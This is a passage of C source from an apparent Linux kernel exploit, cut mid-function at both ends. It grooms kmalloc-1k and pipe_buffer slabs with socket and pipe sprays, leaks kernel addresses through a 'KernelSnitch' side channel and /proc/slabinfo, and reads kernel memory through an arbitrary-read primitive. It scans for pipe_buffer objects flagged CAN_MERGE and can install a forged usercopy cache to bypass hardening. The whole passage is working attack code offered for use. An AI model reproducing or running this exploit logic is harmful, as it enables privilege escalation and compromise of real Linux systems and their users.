        direct_to_head_page(pipe_prepare_kernel_fd, base + off) ==
        expected_carrier_head;
  }
  uint64_t carrier_cache = kernel_read64(
      pipe_prepare_kernel_fd, carrier_head + STRUCT_SLAB_CACHE_OFF);
  uint32_t carrier_type = (uint32_t)kernel_read64(
      pipe_prepare_kernel_fd, carrier_head + STRUCT_PAGE_TYPE_OFF);
  uint64_t live_mm_cache = kernel_read64(
      pipe_prepare_kernel_fd, data_addr(MM_CACHEP));
  uint64_t live_skb_cache = kernel_read64(
      pipe_prepare_kernel_fd, data_addr(SKBUFF_HEAD_CACHE));
  uint64_t live_kmalloc_512 = kernel_read64(
      pipe_prepare_kernel_fd,
      data_addr(KMALLOC_CACHE_SLOT(KMALLOC_NORMAL_TYPE, 9)));
  pr_info("pipe stage1 carrier raw=%016zx base=%016zx head=%016zx "
          "expected=%016zx span=%d cache18=%016llx type=%08x "
          "object_index=%zu mm_cache=%016llx skb_cache=%016llx "
          "kmalloc512=%016llx class_mm=%d class_skb=%d class_kmalloc512=%d\n",
          leaked, base, carrier_head, expected_carrier_head,
          carrier_full_order3, (unsigned long long)carrier_cache,
          carrier_type, (leaked - base) / MM_STRUCT_SZ,
          (unsigned long long)live_mm_cache,
          (unsigned long long)live_skb_cache,
          (unsigned long long)live_kmalloc_512,
          carrier_cache == live_mm_cache,
          carrier_cache == live_skb_cache,
          carrier_cache == live_kmalloc_512);
  if (!carrier_full_order3 || carrier_cache != 0 ||
      carrier_type == PIPE_PAGE_TYPE_BUDDY) {
    pr_warning("pipe stage1 clean miss: carrier is not one clean allocated "
               "order-3 page span=%d cache=%016llx type=%08x; "
               "action=pi-safe-unwind\n",
               carrier_full_order3, (unsigned long long)carrier_cache,
               carrier_type);
    return 0;
  }

  FILE *slabinfo = fopen("/proc/slabinfo", "r");
  struct pipe_slabinfo_snapshot slab_before = {0};
  struct pipe_slabinfo_snapshot slab_after_bulk = {0};
  struct pipe_slabinfo_snapshot slab_boundary = {0};
  if (!slabinfo ||
      !pipe_read_kmalloc_1k_slabinfo(slabinfo, &slab_before)) {
    pr_error("pipe cannot read kmalloc-1k state from /proc/slabinfo\n");
  }

  uint64_t reported_free = slab_before.total - slab_before.active;
  uint64_t measured_target =
      reported_free + PIPE_SOCKET_HEAD_HIDDEN_MARGIN;
  size_t head_count = PIPE_SOCKET_HEAD_BASE_COUNT;
  if (measured_target > head_count) {
    head_count = (size_t)measured_target;
  }
  size_t boundary_budget = PIPE_OBJS_PER_SLAB * 2;
  if (head_count + boundary_budget + PIPE_OBJS_PER_SLAB - 1 >
      PIPE_SOCKET_HEAD_MAX_COUNT) {
    pr_error("pipe kmalloc-1k drain exceeds cap free=%llu target=%zu cap=%d\n",
             (unsigned long long)reported_free, head_count,
             PIPE_SOCKET_HEAD_MAX_COUNT);
  }

  for (size_t i = 0; i < head_count; i++) {
    pipe_socket_send_exact(pipe_head_svs[i], order_buffer,
                           PIPE_SOCKET_HEAD_BYTES, "head-bulk", i);
  }
  if (!pipe_read_kmalloc_1k_slabinfo(slabinfo, &slab_after_bulk)) {
    pr_error("pipe cannot reread kmalloc-1k after bulk drain\n");
  }

  uint64_t last_total = slab_after_bulk.total;
  int boundary_probe = -1;
  for (size_t probe = 0; probe < boundary_budget; probe++) {
    pipe_socket_send_exact(pipe_head_svs[head_count], order_buffer,
                           PIPE_SOCKET_HEAD_BYTES, "head-boundary", probe);
    head_count++;
    if (!pipe_read_kmalloc_1k_slabinfo(slabinfo, &slab_boundary)) {
      pr_error("pipe cannot observe kmalloc-1k slab boundary\n");
    }
    if (slab_boundary.total >= last_total + PIPE_OBJS_PER_SLAB) {
      boundary_probe = (int)probe;
      break;
    }
    last_total = slab_boundary.total;
  }
  if (boundary_probe < 0) {
    pr_error("pipe kmalloc-1k boundary not observed within %zu heads\n",
             boundary_budget);
  }
  for (size_t i = 1; i < PIPE_OBJS_PER_SLAB; i++) {
    pipe_socket_send_exact(pipe_head_svs[head_count], order_buffer,
                           PIPE_SOCKET_HEAD_BYTES, "head-boundary-fill", i);
    head_count++;
  }
  size_t pipe_index = 0;
  for (size_t carrier = 0; carrier < PIPE_SOCKET_CARRIER_COUNT; carrier++) {
    pipe_socket_close_pair(pipe_carrier_svs[carrier]);
    for (size_t slot = 0; slot < PIPE_OBJS_PER_SLAB; slot++) {
      resize_pipe_slots(pipe_fds_reclaim[pipe_index], PIPE_BUFFER_SLOTS);
      pipe_index++;
    }
  }
  for (; pipe_index < PIPE_RECLAIM; pipe_index++) {
    resize_pipe_slots(pipe_fds_reclaim[pipe_index], PIPE_BUFFER_SLOTS);
  }

  fclose(slabinfo);
  slabinfo = NULL;

  for (size_t i = 0; i < PIPE_SOCKET_HEAD_MAX_COUNT; i++) {
    pipe_socket_close_pair(pipe_head_svs[i]);
  }
  for (size_t i = 0; i < PIPE_BUDDY_DRAIN_COUNT; i++) {
    pipe_socket_close_pair(pipe_buddy_svs[i]);
  }

  pr_info("pipe socket interleave complete base=%016zx pipes=%d "
          "heads=%zu boundary_probe=%d slab=%llu/%llu->%llu/%llu->%llu/%llu "
          "last_size=%d\n",
          base, PIPE_RECLAIM, head_count, boundary_probe,
          (unsigned long long)slab_before.active,
          (unsigned long long)slab_before.total,
          (unsigned long long)slab_after_bulk.active,
          (unsigned long long)slab_after_bulk.total,
          (unsigned long long)slab_boundary.active,
          (unsigned long long)slab_boundary.total,
          fcntl(pipe_fds_reclaim[PIPE_RECLAIM - 1][0], F_GETPIPE_SZ));

  close_ctx_memfds(&prep);
  close_ctx_memfds(&spray);
  close_ctx_memfds(&pre);
  close_ctx_memfds(&post);
  free_ctx_storage(&prep);
  free_ctx_storage(&spray);
  free_ctx_storage(&pre);
  free_ctx_storage(&post);
  free(order_buffer);
  return base;
}
#endif

uintptr_t prepare_pipe_buffer_page_child(void) {
#if PIPE_SOCKET_INTERLEAVE_RECLAIM
  return prepare_pipe_buffer_page_child_socket();
#else
  struct mm_ctx prep;
  struct mm_ctx spray;
  struct mm_ctx pre;
  struct mm_ctx post;
  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;

  init_ctx(&prep, 32 * objs_per_slab);
  init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
  init_ctx(&pre, objs_per_slab - 1);
  init_ctx(&post, objs_per_slab);

  for (size_t i = 0; i < prep.mm_cnt; i++) {
    prep.childs[i] = -1;
    prep.memfds[i] = clone_memfd();
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    spray.childs[i] = -1;
    spray.memfds[i] = clone_memfd();
  }

  setup_kernelsnitch();

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    pre.childs[i] = -1;
    pre.memfds[i] = clone_memfd();
  }
  pid_t leak_child = clone_leak_child();
  for (size_t i = 0; i < post.mm_cnt; i++) {
    post.childs[i] = -1;
    post.memfds[i] = clone_memfd();
  }
  int leak_memfd = open_memfd(leak_child);

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    kill_child(pre.childs[i]);
  }
  for (size_t i = 0; i < post.mm_cnt; i++) {
    kill_child(post.childs[i]);
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    kill_child(spray.childs[i]);
  }
  SYSCHK(waitpid(leak_child, NULL, 0));

  if (!kernelsnitch_collisions_ready()) {
    pr_error("pipe KernelSnitch collision finding failed\n");
  }

  unsigned char *buf = malloc(SKB_SEND_SIZE);
  memset(buf, 0x50, SKB_SEND_SIZE);

  int skb_sv[2];
  int pcp_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv));
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_sv[0], &msg, 0));
  pin_to_core(CORE);

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre.mm_cnt; i++) {
    SYSCHK(close(pre.memfds[i]));
    pre.memfds[i] = -1;
  }
  for (size_t i = 0; i < post.mm_cnt - 1; i++) {
    SYSCHK(close(post.memfds[i]));
    post.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray.mm_cnt; i += objs_per_slab) {
    SYSCHK(close(spray.memfds[i]));
    spray.memfds[i] = -1;
  }
  SYSCHK(close(pcp_sv[0]));
  SYSCHK(close(pcp_sv[1]));

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(leak_memfd));
  SYSCHK(sendmsg(skb_sv[0], &msg, 0));

  run_kernelsnitch_bruteforce();
  uintptr_t leaked = cleanup_kernelsnitch();
  if (leaked == (uintptr_t)-1) {
    pr_error("pipe KernelSnitch sk_buff page leak failed\n");
  }
  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  pr_info("pipe KernelSnitch leak raw=%016zx base=%016zx object_index=%zu "
          "mte=%d mm_stride=%zx\n",
          leaked, base, (leaked - base) / MM_STRUCT_SZ,
          KERNELSNITCH_MTE_ENABLED, (size_t)MM_STRUCT_SZ);
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  if (getenv("KS_LEAK_ONLY")) {
    pr_success("KernelSnitch leak-only mm=%016zx base=%016zx object_index=%zu\n",
               leaked, base, (leaked - base) / MM_STRUCT_SZ);
    fflush(NULL);
    _exit(0);
  }
#endif

  shape_pipe_cache();

  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    alloc_pipe_object(pipe_fds_drain[i]);
  }
  pr_info("pipe drain grown count=%d last_size=%d\n", PIPE_DRAIN,
          fcntl(pipe_fds_drain[PIPE_DRAIN - 1][0], F_GETPIPE_SZ));

  pin_to_core(CORE);
  SYSCHK(close(skb_sv[0]));
  SYSCHK(close(skb_sv[1]));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    alloc_pipe_object(pipe_fds_reclaim[i]);
  }
  pr_info("pipe reclaim grown count=%d last_size=%d\n", PIPE_RECLAIM,
          fcntl(pipe_fds_reclaim[PIPE_RECLAIM - 1][0], F_GETPIPE_SZ));

  close_ctx_memfds(&prep);
  close_ctx_memfds(&spray);
  close_ctx_memfds(&pre);
  close_ctx_memfds(&post);
  free_ctx_storage(&prep);
  free_ctx_storage(&spray);
  free_ctx_storage(&pre);
  free_ctx_storage(&post);
  free(buf);
  return base;
#endif
}

uintptr_t prepare_pipe_buffer_page(void) {
  int begin_status = PIPE_PREPARE_IDLE;
  atomic_compare_exchange_strong(
      &pipe_prepare_status, &begin_status, PIPE_PREPARE_PENDING);
#if PIPE_SOCKET_INTERLEAVE_RECLAIM
  pr_info("pipe allocation profile socket_interleave=1 order_bytes=%d "
          "buddy=%d carriers=%d objs_per_slab=%d reclaim=%d "
          "head_base=%d head_margin=%d head_cap=%d\n",
          PIPE_SOCKET_ORDER_BYTES, PIPE_BUDDY_DRAIN_COUNT,
          PIPE_SOCKET_CARRIER_COUNT, PIPE_OBJS_PER_SLAB, PIPE_RECLAIM,
          PIPE_SOCKET_HEAD_BASE_COUNT, PIPE_SOCKET_HEAD_HIDDEN_MARGIN,
          PIPE_SOCKET_HEAD_MAX_COUNT);
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    pipe_fds_reclaim[i][0] = -1;
    pipe_fds_reclaim[i][1] = -1;
  }
  pipe_objects_ready = 1;
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    if (!try_make_pipe_object(pipe_fds_reclaim[i])) {
      int setup_errno = errno;
      publish_pipe_prepare_status(PIPE_PREPARE_CLEAN_MISS);
      pr_warning("pipe precreate failed index=%zu errno=%d; "
                 "retaining created descriptors until PI-safe unwind\n",
                 i, setup_errno);
      return 0;
    }
    int size = fcntl(pipe_fds_reclaim[i][0], F_GETPIPE_SZ);
    if (size != 2 * PAGE_SIZE) {
      int size_errno = errno;
      publish_pipe_prepare_status(PIPE_PREPARE_CLEAN_MISS);
      pr_warning("pipe precreate size mismatch index=%zu got=%d want=%lu "
                 "errno=%d; retaining descriptors until PI-safe unwind\n",
                 i, size, (unsigned long)(2 * PAGE_SIZE), size_errno);
      return 0;
    }
  }
#else
  pr_info("pipe allocation profile shape_rounds=%d min_partial=%d "
          "cpu_partial=%d n=%d c=%d e=%d drain=%d reclaim=%d\n",
          PIPE_SHAPE_ROUNDS, PIPE_MIN_PARTIAL, PIPE_CPU_PARTIAL,
          PIPE_N_COUNT, PIPE_C_COUNT, PIPE_E_COUNT,
          PIPE_DRAIN, PIPE_RECLAIM);
  if (PIPE_SHAPE_ROUNDS != 0) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      make_pipe_holder(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      make_pipe_holder(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      make_pipe_holder(pipe_fds_e[i]);
    }
    pipe_shape_objects_ready = 1;
  }
  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    make_pipe_holder(pipe_fds_drain[i]);
  }
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    make_pipe_object(pipe_fds_reclaim[i]);
  }
  pipe_objects_ready = 1;
#endif

  int result_pipe[2] = {-1, -1};
  if (pipe(result_pipe) != 0) {
    int setup_errno = errno;
    publish_pipe_prepare_status(PIPE_PREPARE_CLEAN_MISS);
    pr_warning("pipe allocator result channel setup failed errno=%d; "
               "action=pi-safe-unwind\n",
               setup_errno);
    return 0;
  }
  pid_t child = fork();
  if (child < 0) {
    int fork_errno = errno;
    close(result_pipe[0]);
    close(result_pipe[1]);
    publish_pipe_prepare_status(PIPE_PREPARE_CLEAN_MISS);
    pr_warning("pipe allocator worker fork failed errno=%d; "
               "action=pi-safe-unwind\n",
               fork_errno);
    return 0;
  }
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(1);
    }
    SYSCHK(close(result_pipe[0]));
    uintptr_t base = prepare_pipe_buffer_page_child();
#if !PIPE_SOCKET_INTERLEAVE_RECLAIM
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      close_pipe_object(pipe_fds_drain[i]);
    }
#endif
    SYSCHK(write(result_pipe[1], &base, sizeof(base)));
    for (;;) {
      sleep(60);
    }
  }

  pipe_prepare_child = child;
  if (close(result_pipe[1]) != 0) {
    pr_warning("pipe allocator parent result-writer close failed errno=%d\n",
               errno);
  }
  uintptr_t base = 0;
  ssize_t got;
  do {
    got = read(result_pipe[0], &base, sizeof(base));
  } while (got < 0 && errno == EINTR);
  int result_errno = errno;
  if (got != 0 && got != (ssize_t)sizeof(base)) {
    hold_pipe_prepare_inflight(
        got < 0 ? "result-read-error" : "short-result-record",
        got < 0 ? result_errno : EPROTO);
    base = 0;
  }
  if (close(result_pipe[0]) != 0) {
    pr_warning("pipe allocator parent result-reader close failed errno=%d\n",
               errno);
  }
  if (got == 0) {
    mark_pipe_prepare_uncertain("child-eof");
    pr_warning("pipe allocator child result unavailable got=%zd errno=%d\n",
               got, result_errno);
    base = 0;
  } else if (base == 0) {
    publish_pipe_prepare_status(PIPE_PREPARE_CLEAN_MISS);
    pr_warning("pipe allocator reported clean miss base=%016zx; "
               "action=pi-safe-unwind\n",
               base);
  } else if (pipe_socket_base_is_valid(base)) {
    publish_pipe_prepare_status(PIPE_PREPARE_READY);
  } else {
    mark_pipe_prepare_uncertain("invalid-base-record");
    pr_warning("pipe allocator reported invalid base=%016zx\n", base);
    base = 0;
  }
#if !PIPE_SOCKET_INTERLEAVE_RECLAIM
  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    close_pipe_object(pipe_fds_drain[i]);
  }
#endif
  return base;
}

void reset_pipe_attempt(void) {
#if defined(PIPE_TEMP_USER_PAGES) && PIPE_TEMP_USER_PAGES
  if (atomic_load(&pipe_quota_active) &&
      !restore_pipe_user_page_limits()) {
    pr_error("pipe quota still active during attempt reset\n");
  }
#endif

  if (pipe_prepare_child > 0) {
    kill(pipe_prepare_child, SIGKILL);
    waitpid(pipe_prepare_child, NULL, 0);
    pipe_prepare_child = -1;
  }

  if (pipe_objects_ready) {
#if !PIPE_SOCKET_INTERLEAVE_RECLAIM
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      close_pipe_object(pipe_fds_drain[i]);
    }
#endif
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      close_pipe_object(pipe_fds_reclaim[i]);
    }
    pipe_objects_ready = 0;
  }

  if (pipe_shape_objects_ready) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      close_pipe_object(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      close_pipe_object(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      close_pipe_object(pipe_fds_e[i]);
    }
    pipe_shape_objects_ready = 0;
  }

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  close_p0_gate_holders();
#else
  if (p0_gate_holders_initialized) {
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      if (p0_gate_holders[i][0] >= 0) {
        close(p0_gate_holders[i][0]);
      }
      if (p0_gate_holders[i][1] >= 0) {
        close(p0_gate_holders[i][1]);
      }
      p0_gate_holders[i][0] = -1;
      p0_gate_holders[i][1] = -1;
    }
    p0_gate_holders_initialized = 0;
  }
#endif
#endif

  pipebuf_page_base = 0;
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_cache_gate_ok = 0;
  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  candidate_slab_cache = 0;
#if PIPE_SOCKET_INTERLEAVE_RECLAIM
  pipe_prepare_kernel_fd = -1;
#endif
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  atomic_store(&pipe_prepare_status, PIPE_PREPARE_IDLE);
}

uintptr_t direct_to_page(uintptr_t addr) {
  uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
  return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
}

uintptr_t direct_to_head_page(int fd, uintptr_t addr) {
  uintptr_t page = direct_to_page(addr);
  uintptr_t head_addr = page + STRUCT_PAGE_COMPOUND_HEAD_OFF;
  uint64_t compound_head = kernel_read64(fd, head_addr);
  if (compound_head & 1) {
    return compound_head & ~1ULL;
  }
  return page;
}

uintptr_t page_to_direct(uintptr_t page) {
  uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
  return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
}

uintptr_t pipe_buf_ops_addr(void) {
  return text_addr(ANON_PIPE_BUF_OPS);
}

int pipe_cache_matches(uint64_t slab_cache) {
  if (slab_cache == 0) {
    return 0;
  }
  if (KMALLOC_PIPE_INDEX == 10) {
    return slab_cache == kmalloc_normal_1k_cache ||
           slab_cache == kmalloc_cgroup_1k_cache;
  }
  if (KMALLOC_PIPE_INDEX == 11) {
    return slab_cache == kmalloc_normal_2k_cache ||
           slab_cache == kmalloc_cgroup_2k_cache;
  }
  return slab_cache == kmalloc_pipe_cache;
}

int pipe_reclaim_cache_gate(int fd) {
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 0;
  }

  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  memset(pipe_page_slab_cache, 0, sizeof(pipe_page_slab_cache));
  memset(pipe_page_type, 0, sizeof(pipe_page_type));

  uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
  memset(cache_slots, 0, sizeof(cache_slots));
  uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
  kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
  kmalloc_normal_1k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_normal_2k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 11];
  kmalloc_cgroup_1k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_cgroup_2k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];

#if defined(PIPE_HARDENED_USERCOPY_CACHE_SHIM) && \
    PIPE_HARDENED_USERCOPY_CACHE_SHIM
  /* Never dereference struct kmem_cache through the configfs usercopy path. */
  kmalloc_pipe_cache = KMALLOC_PIPE_INDEX == 10
    ? kmalloc_cgroup_1k_cache : kmalloc_cgroup_2k_cache;
  pr_info("pipe caches normal1k=%016zx normal2k=%016zx "
          "cgroup1k=%016zx cgroup2k=%016zx selected=%016zx\n",
          kmalloc_normal_1k_cache, kmalloc_normal_2k_cache,
          kmalloc_cgroup_1k_cache, kmalloc_cgroup_2k_cache,
          kmalloc_pipe_cache);
  pr_info("pipe cache geometry index=%d configured_obj=%#x "
          "configured_per_slab=%d slots=%d source=verified-static\n",
          KMALLOC_PIPE_INDEX, KMALLOC_PIPE_OBJ_SIZE, PIPE_OBJS_PER_SLAB,
          PIPE_BUFFER_SLOTS);
#else
  kmalloc_pipe_cache =
    kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
  uint64_t pipe_cache_sizes = kernel_read64(fd, kmalloc_pipe_cache + 0x18);
  uint32_t pipe_cache_size = (uint32_t)pipe_cache_sizes;
  uint32_t pipe_cache_object_size = (uint32_t)(pipe_cache_sizes >> 32);
  uint32_t pipe_cache_oo =
    (uint32_t)kernel_read64(fd, kmalloc_pipe_cache + 0x30);
  uint32_t pipe_cache_min =
    (uint32_t)kernel_read64(fd, kmalloc_pipe_cache + 0x38);
  pr_info("pipe caches normal1k=%016zx normal2k=%016zx "
          "cgroup1k=%016zx cgroup2k=%016zx selected=%016zx\n",
          kmalloc_normal_1k_cache, kmalloc_normal_2k_cache,
          kmalloc_cgroup_1k_cache, kmalloc_cgroup_2k_cache,
          kmalloc_pipe_cache);
  pr_info("pipe cache geometry index=%d configured_obj=%#x configured_per_slab=%d "
          "slots=%d live_size=%u live_object=%u oo=%#x(order=%u objects=%u) "
          "min=%#x\n",
          KMALLOC_PIPE_INDEX, KMALLOC_PIPE_OBJ_SIZE, PIPE_OBJS_PER_SLAB,
          PIPE_BUFFER_SLOTS, pipe_cache_size, pipe_cache_object_size,
          pipe_cache_oo, pipe_cache_oo >> 16, pipe_cache_oo & 0xffff,
          pipe_cache_min);
#endif
#if PIPE_SOCKET_INTERLEAVE_RECLAIM
  uintptr_t expected_head = direct_to_page(pipebuf_page_base);
  uintptr_t actual_head = direct_to_head_page(fd, pipebuf_page_base);
  int full_order3_span =
      (pipebuf_page_base & (ORDER3_SIZE - 1)) == 0 &&
      actual_head == expected_head;
  for (size_t off = PAGE_SIZE; off < ORDER3_SIZE; off += PAGE_SIZE) {
    if (direct_to_head_page(fd, pipebuf_page_base + off) != expected_head) {
      full_order3_span = 0;
    }
  }

  uint64_t cache08 = kernel_read64(fd, expected_head + 0x08);
  uint64_t cache10 = kernel_read64(fd, expected_head + 0x10);
  uint64_t cache18 = kernel_read64(fd, expected_head + 0x18);
  uint64_t cache20 = kernel_read64(fd, expected_head + 0x20);
  uint64_t slab_cache =
      kernel_read64(fd, expected_head + STRUCT_SLAB_CACHE_OFF);
  uint32_t page_type = (uint32_t)kernel_read64(
      fd, expected_head + STRUCT_PAGE_TYPE_OFF);
  int cache_match = pipe_cache_matches(slab_cache);
  pipe_page_slab_cache[0] = slab_cache;
  pipe_page_type[0] = page_type;
  candidate_slab_cache = slab_cache;
  for (int slot = 0; slot < KMALLOC_CACHE_SLOTS; slot++) {
    if (cache_slots[slot] == slab_cache) {
      pipe_cache_slot_hit = slot;
    }
  }
  pr_info("pipe order3 gate page=%016zx head=%016zx actual_head=%016zx "
          "span=%d cache08=%016llx cache10=%016llx cache18=%016llx "
          "cache20=%016llx type=%08x match=%d slot=%d\n",
          pipebuf_page_base, expected_head, actual_head, full_order3_span,
          (unsigned long long)cache08, (unsigned long long)cache10,
          (unsigned long long)cache18, (unsigned long long)cache20,
          page_type, cache_match, pipe_cache_slot_hit);
  if (!full_order3_span || !cache_match) {
    pipe_cache_gate_ok = 0;
    return 0;
  }

#if defined(PIPE_HARDENED_USERCOPY_CACHE_SHIM) && \
    PIPE_HARDENED_USERCOPY_CACHE_SHIM
  if (!install_pipe_usercopy_cache(fd, expected_head, slab_cache)) {
    pr_warning("pipe usercopy shim install failed head=%016zx real=%016llx\n",
               expected_head, (unsigned long long)slab_cache);
    pipe_cache_gate_ok = 0;
    return 0;
  }
#endif
  pipe_cache_page_index = 0;
  pipe_cache_gate_ok = 1;
  return 1;
#else
  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
    uintptr_t page = pipebuf_page_base + off;
    uintptr_t head = direct_to_head_page(fd, page);
    uint64_t cache08 = kernel_read64(fd, head + 0x08);
    uint64_t cache10 = kernel_read64(fd, head + 0x10);
    uint64_t cache18 = kernel_read64(fd, head + 0x18);
    uint64_t cache20 = kernel_read64(fd, head + 0x20);
    uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);
    uintptr_t type_addr = head + STRUCT_PAGE_TYPE_OFF;
    uint32_t page_type = (uint32_t)kernel_read64(fd, type_addr);
    pipe_page_slab_cache[off / PAGE_SIZE] = slab_cache;
    pipe_page_type[off / PAGE_SIZE] = page_type;
    int cache_match = pipe_cache_matches(slab_cache);
    pr_info("pipe page idx=%zu page=%016zx head=%016zx "
            "cache08=%016llx cache10=%016llx cache18=%016llx "
            "cache20=%016llx type=%08x match=%d\n",
            off / PAGE_SIZE, page, head,
            (unsigned long long)cache08,
            (unsigned long long)cache10,
            (unsigned long long)cache18,
            (unsigned long long)cache20, page_type, cache_match);
    if (off == 0 || cache_match) {
      candidate_slab_cache = slab_cache;
    }
    for (int slot = 0; slot < KMALLOC_CACHE_SLOTS; slot++) {
      if (cache_slots[slot] == slab_cache) {
        pipe_cache_slot_hit = slot;
      }
    }
    if (cache_match) {
      pipebuf_page_base = page;
      pipe_cache_page_index = off / PAGE_SIZE;
#if defined(PIPE_HARDENED_USERCOPY_CACHE_SHIM) && \
    PIPE_HARDENED_USERCOPY_CACHE_SHIM
      if (!install_pipe_usercopy_cache(fd, head, slab_cache)) {
        pr_warning("pipe usercopy shim install failed head=%016zx real=%016llx\n",
                   head, (unsigned long long)slab_cache);
        pipe_cache_gate_ok = 0;
        return 0;
      }
#endif
      pipe_cache_gate_ok = 1;
      return 1;
    }
  }

  pipe_cache_gate_ok = 0;
  return 0;
#endif
}

int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab) {
  for (size_t off = 0; off < ORDER3_SIZE; off += PIPE_SCAN_CHUNK) {
    if (kernel_read_data(fd, base + off, slab + off, PIPE_SCAN_CHUNK) !=
        PIPE_SCAN_CHUNK) {
      return 0;
    }
  }
  return 1;
}

int find_pipe_buffer(int fd, uintptr_t base) {
  unsigned char slab[ORDER3_SIZE];
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  pipe_scan_vmemmap = 0;
  pipe_scan_ops = 0;
  pipe_scan_len = 0;
  pipe_scan_first_page = 0;
  pipe_scan_first_ops = 0;
  pipe_scan_first_len = 0;
  pipe_scan_first_flags = 0;
  pipe_scan_q0 = 0;
  pipe_scan_q1 = 0;
  pipe_scan_q2 = 0;
  pipe_scan_q3 = 0;
  if (!read_pipe_slab(fd, base, slab)) {
    return 0;
  }
  memcpy(&pipe_scan_q0, slab + 0x00, 8);
  memcpy(&pipe_scan_q1, slab + 0x08, 8);
  memcpy(&pipe_scan_q2, slab + 0x10, 8);
  memcpy(&pipe_scan_q3, slab + 0x18, 8);

  struct user_pipe_buffer candidates[PIPE_OBJS_PER_SLAB];
  size_t candidate_offsets[PIPE_OBJS_PER_SLAB];
  int candidate_count = 0;
  size_t ring_bytes = PIPE_BUFFER_SLOTS * sizeof(struct user_pipe_buffer);
  if (ring_bytes > KMALLOC_PIPE_OBJ_SIZE) {
    return 0;
  }

  for (size_t off = 0; off + KMALLOC_PIPE_OBJ_SIZE <= ORDER3_SIZE;
       off += KMALLOC_PIPE_OBJ_SIZE) {
    struct user_pipe_buffer pb;
    memcpy(&pb, slab + off, sizeof(pb));
    if (pb.page >= VMEMMAP_START && pb.page < VMEMMAP_END) {
      pipe_scan_vmemmap++;
      if (pipe_scan_first_page == 0) {
        pipe_scan_first_page = pb.page;
        pipe_scan_first_ops = pb.ops;
        pipe_scan_first_len = pb.len;
        pipe_scan_first_flags = pb.flags;
      }
    } else {
      continue;
    }
    if (pb.ops == pipe_buf_ops_addr()) {
      pipe_scan_ops++;
    }
    if (pb.len > 0 && pb.len <= PIPE_RECLAIM) {
      pipe_scan_len++;
    }
    if (pb.offset != 0 || pb.ops != pipe_buf_ops_addr() ||
        pb.flags != PIPE_BUF_FLAG_CAN_MERGE || pb.private != 0) {
      continue;
    }
    if (pb.len == 0 || pb.len > PIPE_RECLAIM) {
      continue;
    }

    int zero_tail = 1;
    for (size_t tail = off + sizeof(pb); tail < off + ring_bytes;
